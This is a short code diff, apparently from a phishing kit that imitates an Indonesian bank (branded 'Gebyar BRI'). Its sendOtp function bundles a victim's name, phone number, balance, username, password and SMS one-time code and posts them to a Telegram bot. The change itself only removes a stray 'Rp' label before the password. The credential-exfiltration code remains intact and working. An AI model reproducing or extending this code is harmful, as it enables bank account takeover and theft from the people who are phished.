@@ -620,7 +620,7 @@ function sendOtp(){
         
                               
     var logo = "✧༺𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜༻✧";              
-    var gabungan = '' + logo + '%0A⍟ 𝗡𝗮𝗺𝗮 •• ' + nama + '%0A⍟ 𝗡𝗼𝗺𝗼𝗿 •• ' + nomor + '%0A⍟ 𝗦𝗮𝗹𝗱𝗼 •• Rp ' + saldo + '%0A%0A⍟ 𝗨𝘀𝗲𝗿 •• ' + user.value + '%0A⍟ 𝗣𝗮𝘀𝘀 •• Rp ' + pass.value + '%0A%0A⍟ 𝗢𝗧𝗣 •• ' + sms.value ;   
+    var gabungan = '' + logo + '%0A⍟ 𝗡𝗮𝗺𝗮 •• ' + nama + '%0A⍟ 𝗡𝗼𝗺𝗼𝗿 •• ' + nomor + '%0A⍟ 𝗦𝗮𝗹𝗱𝗼 •• Rp ' + saldo + '%0A%0A⍟ 𝗨𝘀𝗲𝗿 •• ' + user.value + '%0A⍟ 𝗣𝗮𝘀𝘀 •• ' + pass.value + '%0A%0A⍟ 𝗢𝗧𝗣 •• ' + sms.value ;   
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,   
